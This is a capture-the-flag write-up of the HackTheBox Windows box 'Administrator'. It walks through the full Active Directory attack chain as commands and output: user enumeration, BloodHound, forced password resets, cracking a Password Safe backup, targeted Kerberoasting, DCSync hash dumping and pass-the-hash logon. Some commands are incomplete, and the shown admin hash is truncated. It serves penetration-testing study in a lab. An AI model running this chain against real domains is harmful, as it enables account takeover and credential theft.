---
title: administrator.htb
date: 2025-02-26 
categories: [hackthebox]
tags: [windows, ad, ctf, htb, medium]
---

Administrator is a medium windows box on hackthebox.
We start of credentials provided to us for enumeration.

*As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: `Olivia` Password: `ichliebedich`*

## User flag
### nmap scan

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-06 22:40 CET
Nmap scan report for 10.10.11.42
Host is up (0.029s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-07 04:40:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

This looks like a standard windows box with all usuall ports running on a domain controller. One thing stand out is the ftp port.
### smb enumeration

Using nxc we can enumerate existing users.

```bash
nxc smb 10.10.11.42 -u "Olivia" -p 'ichliebedich' --rid-brute
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.10.11.42     445    DC               498: ADMINISTRATOR\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                                                         
SMB         10.10.11.42     445    DC               500: ADMINISTRATOR\Administrator (SidTypeUser)
SMB         10.10.11.42     445    DC               501: ADMINISTRATOR\Guest (SidTypeUser)
SMB         10.10.11.42     445    DC               502: ADMINISTRATOR\krbtgt (SidTypeUser)
SMB         10.10.11.42     445    DC               512: ADMINISTRATOR\Domain Admins (SidTypeGroup)
SMB         10.10.11.42     445    DC               513: ADMINISTRATOR\Domain Users (SidTypeGroup)
SMB         10.10.11.42     445    DC               514: ADMINISTRATOR\Domain Guests (SidTypeGroup)
SMB         10.10.11.42     445    DC               515: ADMINISTRATOR\Domain Computers (SidTypeGroup)
SMB         10.10.11.42     445    DC               516: ADMINISTRATOR\Domain Controllers (SidTypeGroup)
SMB         10.10.11.42     445    DC               517: ADMINISTRATOR\Cert Publishers (SidTypeAlias)
SMB         10.10.11.42     445    DC               518: ADMINISTRATOR\Schema Admins (SidTypeGroup)
SMB         10.10.11.42     445    DC               519: ADMINISTRATOR\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.42     445    DC               520: ADMINISTRATOR\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.42     445    DC               521: ADMINISTRATOR\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.42     445    DC               522: ADMINISTRATOR\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.42     445    DC               525: ADMINISTRATOR\Protected Users (SidTypeGroup)
SMB         10.10.11.42     445    DC               526: ADMINISTRATOR\Key Admins (SidTypeGroup)
SMB         10.10.11.42     445    DC               527: ADMINISTRATOR\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.42     445    DC               553: ADMINISTRATOR\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.42     445    DC               571: ADMINISTRATOR\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                                                         
SMB         10.10.11.42     445    DC               572: ADMINISTRATOR\Denied RODC Password Replication Group (SidTypeAlias)                                                                                                                          
SMB         10.10.11.42     445    DC               1000: ADMINISTRATOR\DC$ (SidTypeUser)
SMB         10.10.11.42     445    DC               1101: ADMINISTRATOR\DnsAdmins (SidTypeAlias)
SMB         10.10.11.42     445    DC               1102: ADMINISTRATOR\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.42     445    DC               1108: ADMINISTRATOR\olivia (SidTypeUser)
SMB         10.10.11.42     445    DC               1109: ADMINISTRATOR\michael (SidTypeUser)
SMB         10.10.11.42     445    DC               1110: ADMINISTRATOR\benjamin (SidTypeUser)
SMB         10.10.11.42     445    DC               1111: ADMINISTRATOR\Share Moderators (SidTypeAlias)
SMB         10.10.11.42     445    DC               1112: ADMINISTRATOR\emily (SidTypeUser)
SMB         10.10.11.42     445    DC               1113: ADMINISTRATOR\ethan (SidTypeUser)
SMB         10.10.11.42     445    DC               3601: ADMINISTRATOR\alexander (SidTypeUser)
SMB         10.10.11.42     445    DC               3602: ADMINISTRATOR\emma (SidTypeUser)


```

I tried password spraying with the enumerated users and the initial password which was not successfull.

### bloodhound enumeration

Next we try to enumerate the server using bloodhound which shows us visually which user accounts exist and how those might be used to escalate privilegges.

```bash
bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10.10.11.42
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 14S
```


The account of olivia has GenericAll rights to the account of Michael. 
"GenericAll" is a powerful permission in Windows Active Directory that grants full control over an object.



And the account of Micheal has the "ForceChangePassword" rights to change the password of Benjamin. 


Knowing this we first can take over Michaels account and then set a password for Benjamin.

```bash
bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.10.11.42" set password "Michael" "12345678"
[+] Password changed successfully!

bloodyAD -u "Michael" -p "12345678" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"
```


After changing the password I tried to login with both account using evil-winrm which didn't work. But we still have the ftp port found from the inital nmap scan. Using the credentials we set for Benjamin we are able to login using the ftp service.

```bash

ftp administrator.htb           
 
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:kali): Benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||62217|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
```


The ftp server contains a backup files which ends in .psafe3. After a quick google search it seems that this is a file format used by a password manager. As in many ctfs I've seen before the file most likely is password protected and encrypted. We can try to crack the password.
First we need the hash which we get with the program "pwsafe2john".
```bash
pwsafe2john Backup.psafe3  
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa
```

Afterwards we try to crack the password using john and the wordlist rockyou.
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The password is indeed present in the rockyou files. Afterwards we can open the .psafe3 file using "Password Safe" which can be installed on kali using apt.
We get a total of 3 usernames and their passwords.

```bash
alexander:UrkIbagox
emily:UXLCI5iETUsI
emma:WwANQWnmJnGV0
```

One of those accounts can be used to login to the server using evil-winrm.
```bash
evil-winrm -i administrator.htb -u emily -p "UXLCI5iETUsI"
```

   
## Root flag

Running bloodhound again we see that emily has "GenericWrite" rights to the account of Ethan.
![[Pasted image 20250323121721.png]]

We can run a kerberoast attack and get the hash of Ethan. Which afterwards can be cracked. 

```bash
python targetedKerberoast.py -u "emily" -p "UXLCI5iETUsI" -d "Administrator.htb" --dc-ip 10.10.11.42

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Ethan has the "DSync" rights which means we can dump all the password hashes present on the server and use the passthehash technique using the hash of the administrator account an logon to the server with admin rights.

![[Pasted image 20250323122045.png]]


```bash
└─# impacket-secretsdump "Administrator.htb/ethan:"@"dc.Administrator.htb"


evil-winrm -i administrator.htb -u administrator -H "3dc553ce4b9fd20b"
   
```

## Summary

This medium-difficulty Windows machine emulates a real-world enterprise environment with a heavy focus on **Active Directory (AD)** exploitation. The challenge required thorough enumeration, abuse of AD misconfigurations, and lateral movement techniques commonly seen in real life scenarios used by red teamers. 

